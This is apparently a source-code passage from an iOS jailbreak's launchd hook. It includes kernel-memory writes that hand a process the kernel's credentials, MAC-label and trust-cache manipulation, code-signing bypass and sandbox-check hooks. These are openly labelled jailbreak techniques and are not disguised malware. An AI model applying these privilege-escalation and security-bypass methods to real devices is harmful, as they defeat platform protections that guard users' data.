		int64_t result = jbclient_platform_stage_jailbreak_update(updateFile);
		if (result == 0) {
			printf("Staged update for installation during the next userspace reboot, userspace rebooting now...\n");
			usleep(10000);
			return reboot3(RB2_USERREBOOT);
		}
		else {
			printf("Staging update failed with error code %lld\n", result);
			return result;
		}
	}
	else if (!strcmp(cmd, "internal")) {
		if (getuid() != 0) return 41;
		if (argc < 3) return 42;

		const char *internalCmd = argv[2];
		return jbctl_handle_internal(internalCmd, argc-2, &argv[2]);
	}

	return 0;
}

```

`BaseBin/launchdhook/Makefile`:

```
TARGET = launchdhook.dylib
CC = clang

CFLAGS = -framework Foundation -framework CoreServices -framework Security -I../.include -Isrc -isysroot $(shell xcrun --sdk iphoneos --show-sdk-path) -arch arm64 -arch arm64e -miphoneos-version-min=15.0 -Wno-deprecated-declarations -fobjc-arc -O2
LDFLAGS = -dynamiclib -rpath @loader_path/fallback -L../.build -L../_external/lib -ljailbreak -lellekit -lbsm

sign: $(TARGET)
	@ldid -S $^

$(TARGET): $(wildcard src/*.m src/*.c src/jbserver/*.c ../systemhook/src/common.c ../systemhook/src/envbuf.c)
	$(CC) $(CFLAGS) $(LDFLAGS) -o $@ $^

clean:
	@rm -f $(TARGET)

```

`BaseBin/launchdhook/src/asl.h`:

```h
#ifndef __LDH_ASL_H
#define __LDH_ASL_H

#include <os/once_private.h>

struct asl_context {
	bool asl_enabled;
	const char *progname;
	int asl_fd;
#if TARGET_OS_SIMULATOR && !TARGET_OS_MACCATALYST
	const char *sim_log_path;
	os_unfair_lock sim_connect_lock;
#else
	os_once_t connect_once;
#endif
};

#endif
```

`BaseBin/launchdhook/src/boomerang.c`:

```c
#include <spawn.h>
#include <libjailbreak/libjailbreak.h>
#include <libjailbreak/jbserver.h>
#include <libjailbreak/jbserver_boomerang.h>
#include <libjailbreak/physrw.h>
#include <libjailbreak/physrw_pte.h>
#include <libjailbreak/primitives_IOSurface.h>
#include <libjailbreak/kalloc_pt.h>
#include <libjailbreak/kcall_Fugu14.h>
#include <libjailbreak/kcall_arm64.h>
#include <unistd.h>

int posix_spawnattr_set_registered_ports_np(posix_spawnattr_t *__restrict attr, mach_port_t portarray[], uint32_t count);

#define JB_DOMAIN_PRIMITIVE_STORAGE 10

#define JB_PRIMITIVE_STORAGE_RETRIEVE_PHYSRW 1
#define JB_PRIMITIVE_STORAGE_RETRIEVE_KCALL 2

void boomerang_stashPrimitives()
{
	dispatch_semaphore_t boomerangDone = dispatch_semaphore_create(0);

	mach_port_t serverPort = MACH_PORT_NULL;
	mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &serverPort);
	mach_port_insert_right(mach_task_self(), serverPort, serverPort, MACH_MSG_TYPE_MAKE_SEND);

	// Small server provided to boomerang to obtain exploit primitives
	dispatch_source_t serverSource = dispatch_source_create(DISPATCH_SOURCE_TYPE_MACH_RECV, (uintptr_t)serverPort, 0, dispatch_get_main_queue());
	dispatch_source_set_event_handler(serverSource, ^{
		xpc_object_t xdict = NULL;
		if (!xpc_pipe_receive(serverPort, &xdict)) {
			if (jbserver_received_boomerang_xpc_message(&gBoomerangServer, xdict) == JBS_BOOMERANG_DONE) {
				dispatch_semaphore_signal(boomerangDone);
			}
			xpc_release(xdict);
		}
	});
	dispatch_resume(serverSource);

	// Spawn boomerang process
	pid_t boomerangPid = 0;
	posix_spawnattr_t attr = NULL;
	posix_spawnattr_init(&attr);
	posix_spawnattr_set_registered_ports_np(&attr, (mach_port_t[]){ MACH_PORT_NULL, MACH_PORT_NULL, serverPort }, 3);
	int ret = posix_spawn(&boomerangPid, JBROOT_PATH("/basebin/boomerang"), NULL, &attr, NULL, NULL);
	if (ret != 0) return;
	posix_spawnattr_destroy(&attr);

	// Wait for boomerang to retrieve the primitives from launchd (handled in server above)
	dispatch_semaphore_wait(boomerangDone, DISPATCH_TIME_FOREVER);
	dispatch_source_cancel(serverSource);
	mach_port_deallocate(mach_task_self(), serverPort);

	// Stash boomerang pid in environment to later be able to call waitpid on it
	char pidBuf[10];
	snprintf(pidBuf, 10, "%d", boomerangPid);
	setenv("BOOMERANG_PID", pidBuf, 1);
}

int boomerang_recoverPrimitives(bool firstRetrieval, bool shouldEndBoomerang)
{
	// Mach port to boomerang should be stored in our registeredPorts[2]
	// Use it to recover primitives, afterwards replace it with MACH_PORT_NULL to make launchd happy
	mach_port_t *registeredPorts;
	mach_msg_type_number_t registeredPortsCount = 0;
	if (mach_ports_lookup(mach_task_self(), &registeredPorts, &registeredPortsCount) != 0 || registeredPortsCount < 3) return -1;
	mach_port_t boomerangPort = registeredPorts[2];
	if (boomerangPort == MACH_PORT_NULL) return -2;
	jbclient_xpc_set_custom_port(boomerangPort);
	registeredPorts[2] = MACH_PORT_NULL;
	mach_ports_register(mach_task_self(), registeredPorts, registeredPortsCount);

	// Recover boomerang pid from environment
	pid_t boomerangPid = 0;
	const char *pidBuf = getenv("BOOMERANG_PID");
	if (pidBuf) {
		boomerangPid = atoi(pidBuf);
		unsetenv("BOOMERANG_PID");
	}

	// Retrieve primitives
	// For performance reasons we only use physrw_pte until the first userspace reboot
	// Handing off full physrw from the app is really slow and causes watchdog timeouts
	// But from launchd it's generally fine, no clue why
	bool physrwPTE = firstRetrieval && !is_kcall_available();
	jbclient_initialize_primitives_internal(physrwPTE);

	if (shouldEndBoomerang) {
		// Send done message to boomerang
		jbclient_boomerang_done();

		// Remove boomerang zombie proc if needed
		if (boomerangPid != 0) {
			int boomerangStatus;
			waitpid(boomerangPid, &boomerangStatus, WEXITED);
			waitpid(boomerangPid, &boomerangStatus, 0);
		}
	}

	return 0;
}

```

`BaseBin/launchdhook/src/boomerang.h`:

```h
int boomerang_recoverPrimitives(bool firstRetrieval, bool shouldEndBoomerang);
void boomerang_stashPrimitives(void);
```

`BaseBin/launchdhook/src/crashreporter.h`:

```h
#import <mach/mach.h>
#include <stdio.h>

typedef int                             exception_type_t;
typedef integer_t                       exception_data_type_t;

typedef struct {
    mach_msg_header_t header;
    mach_msg_body_t msgh_body;
    mach_msg_port_descriptor_t thread;
    mach_msg_port_descriptor_t task;
    int unused1;
    exception_type_t exception;
    exception_data_type_t code;
    int unused2;
    int subcode;
    NDR_record_t ndr;
} exception_raise_request; // the bits we need at least

typedef struct {
    mach_msg_header_t header;
    NDR_record_t ndr;
    kern_return_t retcode;
} exception_raise_reply;

typedef struct {
    mach_msg_header_t header;
    NDR_record_t ndr;
    kern_return_t retcode;
    int flavor;
    mach_msg_type_number_t new_stateCnt;
    natural_t new_state[614];
} exception_raise_state_reply;

typedef enum {
	kCrashReporterStateNotActive = 0,
	kCrashReporterStateActive = 1,
	kCrashReporterStatePaused = 2
} crash_reporter_state;

void crashreporter_start(void);
void crashreporter_pause(void);
void crashreporter_resume(void);

FILE *crashreporter_open_outfile(const char *source, char **nameOut);
void crashreporter_save_outfile(FILE *f);
```

`BaseBin/launchdhook/src/crashreporter.m`:

```m
#include "crashreporter.h"
#include <dlfcn.h>
#include <mach-o/dyld.h>
#include <sys/sysctl.h>
#include <mach/mach.h>
#include <pthread/stack_np.h>
#include <pthread/pthread.h>
#include <mach/exception_types.h>
#include <sys/utsname.h>
#include <dispatch/dispatch.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <CoreFoundation/CoreFoundation.h>
#include <mach-o/dyld.h>
extern CFStringRef CFCopySystemVersionString(void);

void abort_with_reason(uint32_t reason_namespace, uint64_t reason_code, const char *reason_string, uint64_t reason_flags);

#import <Foundation/Foundation.h>

static NSUncaughtExceptionHandler* defaultNSExceptionHandler = NULL;

#define	INSTACK(a)	((a) >= stackbot && (a) <= stacktop)
#if defined(__x86_64__)
#define	ISALIGNED(a)	((((uintptr_t)(a)) & 0xf) == 0)
#elif defined(__i386__)
#define	ISALIGNED(a)	((((uintptr_t)(a)) & 0xf) == 8)
#elif defined(__arm__) || defined(__arm64__)
#define	ISALIGNED(a)	((((uintptr_t)(a)) & 0x1) == 0)
#endif

#define EXC_MASK_CRASH_RELATED (EXC_MASK_BAD_ACCESS | \
		EXC_MASK_BAD_INSTRUCTION |			  \
		EXC_MASK_ARITHMETIC |				  \
		EXC_MASK_EMULATION |				  \
		EXC_MASK_SOFTWARE |					  \
		EXC_MASK_BREAKPOINT)

__attribute__((noinline))
static void pthread_backtrace(pthread_t pthread, vm_address_t *buffer, unsigned max, unsigned *nb,
		unsigned skip, void *startfp)
{
	void *frame, *next;
	void *stacktop = pthread_get_stackaddr_np(pthread);
	void *stackbot = stacktop - pthread_get_stacksize_np(pthread);

	*nb = 0;

	// Rely on the fact that our caller has an empty stackframe (no local vars)
	// to determine the minimum size of a stackframe (frame ptr & return addr)
	frame = startfp;
	next = (void*)pthread_stack_frame_decode_np((uintptr_t)frame, NULL);

	/* make sure return address is never out of bounds */
	stacktop -= (next - frame);

	if(!INSTACK(frame) || !ISALIGNED(frame))
		return;
	while (startfp || skip--) {
		if (startfp && startfp < next) break;
		if(!INSTACK(next) || !ISALIGNED(next) || next <= frame)
			return;
		frame = next;
		next = (void*)pthread_stack_frame_decode_np((uintptr_t)frame, NULL);
	}
	while (max--) {
		uintptr_t retaddr;
		next = (void*)pthread_stack_frame_decode_np((uintptr_t)frame, &retaddr);
		buffer[*nb] = retaddr;
		(*nb)++;
		if(!INSTACK(next) || !ISALIGNED(next) || next <= frame)
			return;
		frame = next;
	}
}

static crash_reporter_state gCrashReporterState = kCrashReporterStateNotActive;
mach_port_t gExceptionPort = MACH_PORT_NULL;
dispatch_queue_t gExceptionQueue = NULL;
pthread_t gExceptionThread = 0;

const char *crashreporter_string_for_code(int code)
{
	switch (code)
	{
		case EXC_BAD_ACCESS:
		return "EXC_BAD_ACCESS";

		case EXC_BAD_INSTRUCTION:
		return "EXC_BAD_INSTRUCTION";

		case EXC_ARITHMETIC:
		return "EXC_ARITHMETIC";

		case EXC_EMULATION:
		return "EXC_EMULATION";

		case EXC_SOFTWARE:
		return "EXC_SOFTWARE";
	
		case EXC_BREAKPOINT:
		return "EXC_BREAKPOINT";

		case EXC_SYSCALL:
		return "EXC_SYSCALL";

		case EXC_MACH_SYSCALL:
		return "EXC_MACH_SYSCALL";

		case EXC_RPC_ALERT:
		return "EXC_RPC_ALERT";

		case EXC_CRASH:
		return "EXC_CRASH";

		case EXC_RESOURCE:
		return "EXC_RESOURCE";

		case EXC_GUARD:
		return "EXC_GUARD";

		case EXC_CORPSE_NOTIFY:
		return "EXC_CORPSE_NOTIFY";
	}
	return NULL;
}

void crashreporter_dump_backtrace_line(FILE *f, vm_address_t addr)
{
	Dl_info info;
	if (dladdr((void *)addr, &info) != 0) {
		const char *sname = info.dli_sname;
		const char *fname = info.dli_fname;
		if (!sname) {
			sname = "<unexported>";
		}

		fprintf(f, "0x%lX: %s (0x%lX + 0x%lX) (%s(0x%lX) + 0x%lX)\n", addr, sname, (vm_address_t)info.dli_saddr, addr - (vm_address_t)info.dli_saddr, fname, (vm_address_t)info.dli_fbase, addr - (vm_address_t)info.dli_fbase);
	}
	else {
		fprintf(f, "0x%lX (no association)\n", addr);
	}
}

FILE *crashreporter_open_outfile(const char *source, char **nameOut)
{
	time_t t = time(NULL);
	char timestamp[64];
	sprintf(&timestamp[0], "%lu", t);

	char *name = malloc(100);
	strlcpy(name, source, 100);
	strlcat(name, "-", 100);
	strlcat(name, timestamp, 100);
	strlcat(name, ".ips", 100);

	char dumpPath[PATH_MAX];
	strlcpy(dumpPath, "/var/mobile/Library/Logs/CrashReporter/", PATH_MAX);
	strlcat(dumpPath, name, PATH_MAX);

	if (nameOut) {
		*nameOut = name;
	}
	else {
		free(name);
	}

	FILE *f = fopen(dumpPath, "w");
	if (f) {
		struct utsname systemInfo;
		uname(&systemInfo);

		fprintf(f, "Device Model:   %s\n", systemInfo.machine);

		CFStringRef deviceVersion = CFCopySystemVersionString();
		if (deviceVersion) {
			fprintf(f, "Device Version: %s\n", CFStringGetCStringPtr(deviceVersion, kCFStringEncodingUTF8));
			CFRelease(deviceVersion);
		}

	#ifdef __arm64e__
		fprintf(f, "Architecture:   arm64e\n");
	#else
		fprintf(f, "Architecture:   arm64\n");
	#endif
		fprintf(f, "\n");
	}

	return f;
}

void crashreporter_save_outfile(FILE *f)
{
	fflush(f);
	fchown(fileno(f), 0, 250);
	fchmod(fileno(f), 00660);
	if (fcntl(fileno(f), F_FULLFSYNC) != 0) {
		fsync(fileno(f));
	}
	fclose(f);

	int dir = open("/var/mobile/Library/Logs/CrashReporter", O_RDONLY | O_DIRECTORY);
	if (dir >= 0) {
		if (fcntl(dir, F_FULLFSYNC) != 0) {
			fsync(dir);
		}
		close(dir);
	}
}

void crashreporter_dump_mach(FILE *f, int code, int subcode, arm_thread_state64_t threadState, arm_exception_state64_t exceptionState, vm_address_t *bt)
{
	fprintf(f, "Exception:         %s\n", crashreporter_string_for_code(code));
	fprintf(f, "Exception Subcode: %d\n", subcode);
	fprintf(f, "\n");

	fprintf(f, "Register State:\n");
	uint64_t pc = (uint64_t)__darwin_arm_thread_state64_get_pc(threadState);
	uint64_t lr = (uint64_t)__darwin_arm_thread_state64_get_lr(threadState);

	for(int i = 0; i <= 28; i++) {
		if (i < 10) {
			fprintf(f, " ");
		}
		fprintf(f, "x%d = 0x%016llX", i, threadState.__x[i]);
		if ((i+1) % (6+1) == 0) {
			fprintf(f, "\n");
		}
		else {
			fprintf(f, ", ");
		}
	}
	fprintf(f, " lr = 0x%016llX,  pc = 0x%016llX,  sp = 0x%016llX,  fp = 0x%016llX, cpsr=         0x%08X, far = 0x%016llX\n\n", lr, pc, (uint64_t)__darwin_arm_thread_state64_get_sp(threadState), (uint64_t)__darwin_arm_thread_state64_get_fp(threadState), threadState.__cpsr, exceptionState.__far);

	fprintf(f, "Backtrace:\n");
	crashreporter_dump_backtrace_line(f, (vm_address_t)pc);
	crashreporter_dump_backtrace_line(f, (vm_address_t)lr);
	int btIdx = 0;
	vm_address_t btAddr = bt[btIdx++];
	while (btAddr != 0) {
		crashreporter_dump_backtrace_line(f, btAddr);
		btAddr = bt[btIdx++];
	}
	fprintf(f, "\n");
}

void crashreporter_dump_image_list(FILE *f)
{
	fprintf(f, "Images:\n");
	for (uint32_t i = 0; i < _dyld_image_count(); i++) {
		fprintf(f, "%s: %p\n", _dyld_get_image_name(i), _dyld_get_image_header(i));
	}
}

void crashreporter_catch_mach(exception_raise_request *request, exception_raise_reply *reply)
{
	pthread_t pthread = pthread_from_mach_thread_np(request->thread.name);

	mach_msg_type_number_t threadStateCount = ARM_THREAD_STATE64_COUNT;
	arm_thread_state64_t threadState;
	thread_get_state(request->thread.name, ARM_THREAD_STATE64, (thread_state_t)&threadState, &threadStateCount);

	arm_exception_state64_t exceptionState;
	mach_msg_type_number_t exceptionStateCount = ARM_EXCEPTION_STATE64_COUNT;
	thread_get_state(request->thread.name, ARM_EXCEPTION_STATE64, (thread_state_t)&exceptionState, &exceptionStateCount);

	reply->ndr = request->ndr;
	reply->retcode = KERN_FAILURE;

	vm_address_t *bt = malloc(100 * sizeof(vm_address_t));
	memset(bt, 0, 100 * sizeof(vm_address_t));
	unsigned c = 100;
	pthread_backtrace(pthread, bt, c, &c, 0, (void *)__darwin_arm_thread_state64_get_fp(threadState));

	char *name = NULL;
	FILE *f = crashreporter_open_outfile("launchd", &name);
	if (f) {
		crashreporter_dump_mach(f, request->code, request->subcode, threadState, exceptionState, bt);
		crashreporter_dump_image_list(f);
		crashreporter_save_outfile(f);
	}

	if (name) {
		char msg[1000];
		snprintf(msg, 1000, "Mach exception occured. A detailed report has been written to the file %s.", name);
		abort_with_reason(7, 1, msg, 0);
	}
	else {
		abort_with_reason(7, 1, "Mach exception occured. Failed to write the detailed report to a file.", 0);
	}
}

void crashreporter_dump_objc(FILE *f, NSException *e)
{
	@autoreleasepool {
		fprintf(f, "Exception:         %s\n", e.name.UTF8String);
		fprintf(f, "Exception Reason:  %s\n", e.reason.UTF8String);
		fprintf(f, "User Info:         %s\n", e.userInfo.description.UTF8String);
		fprintf(f, "\n");

		if (e.callStackReturnAddresses.count) {
			fprintf(f, "Backtrace:\n");
			for (NSNumber *btAddrNum in e.callStackReturnAddresses) {
				crashreporter_dump_backtrace_line(f, [btAddrNum unsignedLongLongValue]);
			}
			fprintf(f, "\n");
		}
		else if (e.callStackSymbols.count) {
			fprintf(f, "Backtrace:\n");
			for (NSString *symbol in e.callStackSymbols) {
				fprintf(f, "%s\n", symbol.UTF8String);
			}
			fprintf(f, "\n");
		} 
	}
}

void crashreporter_catch_objc(NSException *e)
{
	@autoreleasepool {
		static BOOL hasCrashed = NO;
		if (hasCrashed) {
			exit(187);
		}
		else {
			hasCrashed = YES;
		}

		char *name = NULL;
		FILE *f = crashreporter_open_outfile("launchd", &name);
		if (f) {
			@try {
				crashreporter_dump_objc(f, e);
				crashreporter_dump_image_list(f);
			}
			@catch (NSException *e2) {
				exit(187);
			}
			crashreporter_save_outfile(f);
		}
		if (name) {
			char msg[1000];
			snprintf(msg, 1000, "Objective-C exception occured. A detailed report has been written to the file %s.", name);
			abort_with_reason(7, 1, msg, 0);
		}
		else {
			abort_with_reason(7, 1, "Objective-C exception occured. Failed to write the detailed report to a file.", 0);
		}
	}
}

void *crashreporter_listen(void *arg)
{
	while (true) {
		mach_msg_header_t msg;
		msg.msgh_local_port = gExceptionPort;
		msg.msgh_size = 1024;
		mach_msg_receive(&msg);

		exception_raise_reply reply;
		crashreporter_catch_mach((exception_raise_request *)&msg, &reply);

		reply.header.msgh_bits = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(msg.msgh_bits), 0);
		reply.header.msgh_size = sizeof(exception_raise_reply);
		reply.header.msgh_remote_port = msg.msgh_remote_port;
		reply.header.msgh_local_port = MACH_PORT_NULL;
		reply.header.msgh_id = msg.msgh_id + 0x64;

		mach_msg(&reply.header, MACH_SEND_MSG | MACH_MSG_OPTION_NONE, reply.header.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	}
}

void crashreporter_pause(void)
{
	if (gCrashReporterState == kCrashReporterStateActive) {
		task_set_exception_ports(mach_task_self_, EXC_MASK_CRASH_RELATED, 0, EXCEPTION_DEFAULT, ARM_THREAD_STATE64);
		NSSetUncaughtExceptionHandler(defaultNSExceptionHandler);
		defaultNSExceptionHandler = nil;
		gCrashReporterState = kCrashReporterStatePaused;
	}
}

void crashreporter_resume(void)
{
	if (gCrashReporterState == kCrashReporterStatePaused) {
		task_set_exception_ports(mach_task_self_, EXC_MASK_CRASH_RELATED, gExceptionPort, EXCEPTION_DEFAULT, ARM_THREAD_STATE64);
		defaultNSExceptionHandler = NSGetUncaughtExceptionHandler();
		NSSetUncaughtExceptionHandler(crashreporter_catch_objc);
		gCrashReporterState = kCrashReporterStateActive;
	}
}

void crashreporter_start(void)
{
	if (gCrashReporterState == kCrashReporterStateNotActive) {
		mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &gExceptionPort);
		mach_port_insert_right(mach_task_self_, gExceptionPort, gExceptionPort, MACH_MSG_TYPE_MAKE_SEND);
		pthread_create(&gExceptionThread, NULL, crashreporter_listen, "crashreporter");
		gCrashReporterState = kCrashReporterStatePaused;
		crashreporter_resume();
	}
}


```

`BaseBin/launchdhook/src/daemon_hook.h`:

```h
void initDaemonHooks(void);
```

`BaseBin/launchdhook/src/daemon_hook.m`:

```m
#import <xpc/xpc.h>
#import <sys/types.h>
#import <sys/stat.h>
#import <unistd.h>
#import <substrate.h>
#import <mach-o/dyld.h>
#import <libjailbreak/libjailbreak.h>
#import <Foundation/Foundation.h>

extern xpc_object_t xpc_create_from_plist(const void *buf, size_t len);

void xpc_dictionary_add_launch_daemon_plist_at_path(xpc_object_t xdict, const char *path)
{
	int ldFd = open(path, O_RDONLY);
	if (ldFd >= 0) {
		struct stat s = {};
		if(fstat(ldFd, &s) != 0) {
			close(ldFd);
			return;
		}
		size_t len = s.st_size;
		void *addr = mmap(NULL, len, PROT_READ, MAP_FILE | MAP_PRIVATE, ldFd, 0);
		if (addr != MAP_FAILED) {
			xpc_object_t daemonXdict = xpc_create_from_plist(addr, len);
			if (daemonXdict) {
				xpc_dictionary_set_value(xdict, path, daemonXdict);
			}
			munmap(addr, len);
		}
		close(ldFd);
	}
}

xpc_object_t (*xpc_dictionary_get_value_orig)(xpc_object_t xdict, const char *key);
xpc_object_t xpc_dictionary_get_value_hook(xpc_object_t xdict, const char *key)
{
	xpc_object_t origXvalue = xpc_dictionary_get_value_orig(xdict, key);
	if (!strcmp(key, "LaunchDaemons")) {
		if (xpc_get_type(origXvalue) == XPC_TYPE_DICTIONARY) {
			for (NSString *daemonPlistName in [[NSFileManager defaultManager] contentsOfDirectoryAtPath:JBROOT_PATH(@"/basebin/LaunchDaemons") error:nil]) {
				if ([daemonPlistName.pathExtension isEqualToString:@"plist"]) {
					xpc_dictionary_add_launch_daemon_plist_at_path(origXvalue, [JBROOT_PATH(@"/basebin/LaunchDaemons") stringByAppendingPathComponent:daemonPlistName].fileSystemRepresentation);
				}
			}
			for (NSString *daemonPlistName in [[NSFileManager defaultManager] contentsOfDirectoryAtPath:JBROOT_PATH(@"/Library/LaunchDaemons") error:nil]) {
				if ([daemonPlistName.pathExtension isEqualToString:@"plist"]) {
					xpc_dictionary_add_launch_daemon_plist_at_path(origXvalue, [JBROOT_PATH(@"/Library/LaunchDaemons") stringByAppendingPathComponent:daemonPlistName].fileSystemRepresentation);
				}
			}
		}
	}
	else if (!strcmp(key, "Paths")) {
		if (xpc_get_type(origXvalue) == XPC_TYPE_ARRAY) {
			xpc_array_set_string(origXvalue, XPC_ARRAY_APPEND, JBROOT_PATH("/basebin/LaunchDaemons"));
			xpc_array_set_string(origXvalue, XPC_ARRAY_APPEND, JBROOT_PATH("/Library/LaunchDaemons"));
		}
	}
	else if (!strcmp(key, "com.apple.private.xpc.launchd.userspace-reboot")) {
		if (!origXvalue || xpc_get_type(origXvalue) == XPC_TYPE_BOOL) {
			bool origValue = false;
			if (origXvalue) {
				origValue = xpc_bool_get_value(origXvalue);
			}
			if (!origValue) {
				// Allow watchdogd to do userspace reboots
				return xpc_dictionary_get_value_orig(xdict, "com.apple.private.iowatchdog.user-access");
			}
		}
	}
	return origXvalue;
}

void initDaemonHooks(void)
{
	MSHookFunction(&xpc_dictionary_get_value, (void *)xpc_dictionary_get_value_hook, (void **)&xpc_dictionary_get_value_orig);
}
```

`BaseBin/launchdhook/src/ipc_hook.c`:

```c
#include <sandbox.h>
#include <substrate.h>

int (*sandbox_check_by_audit_token_orig)(audit_token_t au, const char *operation, int sandbox_filter_type, ...);
int sandbox_check_by_audit_token_hook(audit_token_t au, const char *operation, int sandbox_filter_type, ...)
{
	va_list a;
	va_start(a, sandbox_filter_type);
	const char *name = va_arg(a, const char *);
	const void *arg2 = va_arg(a, void *);
	const void *arg3 = va_arg(a, void *);
	const void *arg4 = va_arg(a, void *);
	const void *arg5 = va_arg(a, void *);
	const void *arg6 = va_arg(a, void *);
	const void *arg7 = va_arg(a, void *);
	const void *arg8 = va_arg(a, void *);
	const void *arg9 = va_arg(a, void *);
	const void *arg10 = va_arg(a, void *);
	va_end(a);
	if (name && operation) {
		if (strcmp(operation, "mach-lookup") == 0) {
			if (strncmp((char *)name, "cy:", 3) == 0 || strncmp((char *)name, "lh:", 3) == 0) {
				/* always allow */
				return 0;
			}
		}
	}
	return sandbox_check_by_audit_token_orig(au, operation, sandbox_filter_type, name, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10);
}

void initIPCHooks(void)
{
	MSHookFunction(&sandbox_check_by_audit_token, (void *)sandbox_check_by_audit_token_hook, (void **)&sandbox_check_by_audit_token_orig);
}
```

`BaseBin/launchdhook/src/ipc_hook.h`:

```h
void initIPCHooks(void);
```

`BaseBin/launchdhook/src/jbserver/jbdomain_platform.c`:

```c
#include "jbserver_global.h"
#include "jbsettings.h"

#include <libjailbreak/codesign.h>
#include <libjailbreak/libjailbreak.h>

extern void systemwide_domain_set_enabled(bool enabled);

static bool platform_domain_allowed(audit_token_t clientToken)
{
	pid_t pid = audit_token_to_pid(clientToken);
	uint32_t csflags = 0;
	if (csops_audittoken(pid, CS_OPS_STATUS, &csflags, sizeof(csflags), &clientToken) != 0) return false;
	return (csflags & CS_PLATFORM_BINARY);
}

int platform_set_process_debugged(uint64_t pid, bool fullyDebugged)
{
	uint64_t proc = proc_find(pid);
	if (!proc) return -1;
	cs_allow_invalid(proc, fullyDebugged);
	return 0;
}

static int platform_stage_jailbreak_update(const char *updateTar)
{
	if (!access(updateTar, F_OK)) {
		setenv("STAGED_JAILBREAK_UPDATE", updateTar, 1);
		return 0;
	}
	return 1;
}

struct jbserver_domain gPlatformDomain = {
	.permissionHandler = platform_domain_allowed,
	.actions = {
		// JBS_PLATFORM_SET_PROCESS_DEBUGGED
		{
			.handler = platform_set_process_debugged,
			.args = (jbserver_arg[]){
				{ .name = "pid", .type = JBS_TYPE_UINT64, .out = false },
				{ .name = "fully-debugged", .type = JBS_TYPE_BOOL, .out = false },
				{ 0 },
			},
		},
		// JBS_PLATFORM_STAGE_JAILBREAK_UPDATE
		{
			.handler = platform_stage_jailbreak_update,
			.args = (jbserver_arg[]){
				{ .name = "update-tar", .type = JBS_TYPE_STRING, .out = false },
				{ 0 },
			},
		},
		// JBS_PLATFORM_JBSETTINGS_SET
		{
			.handler = jbsettings_set,
			.args = (jbserver_arg[]){
				{ .name = "key", .type = JBS_TYPE_STRING, .out = false },
				{ .name = "value", .type = JBS_TYPE_XPC_GENERIC, .out = false },
				{ 0 },
			},
		},
		// JBS_PLATFORM_SET_SYSTEMWIDE_DOMAIN_ENABLED
		{
			.handler = systemwide_domain_set_enabled,
			.args = (jbserver_arg[]){
				{ .name = "enabled", .type = JBS_TYPE_BOOL, .out = false },
				{ 0 },
			},
		},
		{ 0 },
	},
};
```

`BaseBin/launchdhook/src/jbserver/jbdomain_root.c`:

```c
#include "jbserver_global.h"
#include <libjailbreak/jbserver_boomerang.h>
#include <libjailbreak/trustcache.h>
#include <libjailbreak/info.h>
#include <libjailbreak/kernel.h>
#include <libjailbreak/primitives.h>

static bool root_domain_allowed(audit_token_t clientToken)
{
	return (audit_token_to_euid(clientToken) == 0);
}

static int root_get_physrw(audit_token_t *clientToken, bool singlePTE, uint64_t *singlePTEAsidPtr)
{
	return boomerang_get_physrw(clientToken, singlePTE, singlePTEAsidPtr);
}

static int root_sign_thread(audit_token_t *clientToken, mach_port_t threadPort)
{
	return boomerang_sign_thread(clientToken, threadPort);
}

static int root_get_sysinfo(xpc_object_t *sysInfoOut)
{
	return boomerang_get_sysinfo(sysInfoOut);
}

static int root_steal_ucred(audit_token_t *clientToken, uint64_t ucred, uint64_t *orgUcred)
{
	uint64_t kernproc = proc_find(0);
	uint64_t kern_ucred = proc_ucred(kernproc);
	if (!ucred) {
		// Passing 0 to this means kernel ucred
		ucred = kern_ucred;
	}

	pid_t pid = audit_token_to_pid(*clientToken);
	uint64_t proc = proc_find(pid);

	*orgUcred = proc_ucred(proc);
	if (gSystemInfo.kernelStruct.proc_ro.exists) {
		uint64_t proc_ro = kread_ptr(proc + koffsetof(proc, proc_ro));
		kwrite64(proc_ro + koffsetof(proc_ro, ucred), ucred);
	}
	else {
		kwrite_ptr(proc + koffsetof(proc, ucred), ucred, 0x84E8);
	}

#ifndef __arm64e__
	if (ucred == kern_ucred) {
		// For some reason we need to borrow this from our process just for bind mount entitlement.
		uint64_t our_label = kread_ptr(*orgUcred + koffsetof(ucred, label));
		uint64_t our_slot = mac_label_get(our_label, 0);
		mac_label_set(kread_ptr(kern_ucred + koffsetof(ucred, label)), 0, our_slot);
	}
	else {
		// Revert it to what it should be
		mac_label_set(kread_ptr(kern_ucred + koffsetof(ucred, label)), 0, -1);
	}
#endif
	return 0;
}

static int root_set_mac_label(audit_token_t *clientToken, uint64_t slot, uint64_t newLabel, uint64_t *orgLabel)
{
	if (slot >= 3) return -1;

	pid_t pid = audit_token_to_pid(*clientToken);
	uint64_t proc = proc_find(pid);
	if (!proc) return -1;
	uint64_t ucred = proc_ucred(proc);
	if (!ucred) return -1;

	uint64_t label = kread_ptr(ucred + koffsetof(ucred, label));

	*orgLabel = mac_label_get(label, slot);
	mac_label_set(label, slot, newLabel);

	return 0;
}

static int root_trustcache_info(xpc_object_t *infoOut)
{
	*infoOut = jb_trustcache_info();
	return 0;
}

static int root_trustcache_add_cdhash(uint8_t *cdhashData, size_t cdhashLen)
{
	if (cdhashLen != CS_CDHASH_LEN) return -1;
	return jb_trustcache_add_cdhashes((cdhash_t *)cdhashData, 1);
}

static int root_trustcache_clear(void)
{
	jb_trustcache_clear();
	return 0;
}

struct jbserver_domain gRootDomain = {
	.permissionHandler = root_domain_allowed,
	.actions = {
		// JBS_ROOT_GET_PHYSRW
		{
			.handler = root_get_physrw,
			.args = (jbserver_arg[]){
				{ .name = "caller-token", .type = JBS_TYPE_CALLER_TOKEN, .out = false },
				{ .name = "single-pte", .type = JBS_TYPE_BOOL, .out = false },
				{ .name = "single-pte-asid-ptr", .type = JBS_TYPE_UINT64, .out = true },
				{ 0 },
			},
		},
		// JBS_ROOT_SIGN_THREAD
		{
			.handler = root_sign_thread,
			.args = (jbserver_arg[]){
				{ .name = "caller-token", .type = JBS_TYPE_CALLER_TOKEN, .out = false },
				{ .name = "thread-port", .type = JBS_TYPE_UINT64, .out = false },
				{ 0 },
			},
		},
		// JBS_ROOT_GET_SYSINFO
		{
			.handler = root_get_sysinfo,
			.args = (jbserver_arg[]){
				{ .name = "sysinfo", .type = JBS_TYPE_DICTIONARY, .out = true },
				{ 0 },
			},
		},
		// JBS_ROOT_STEAL_UCRED
		{
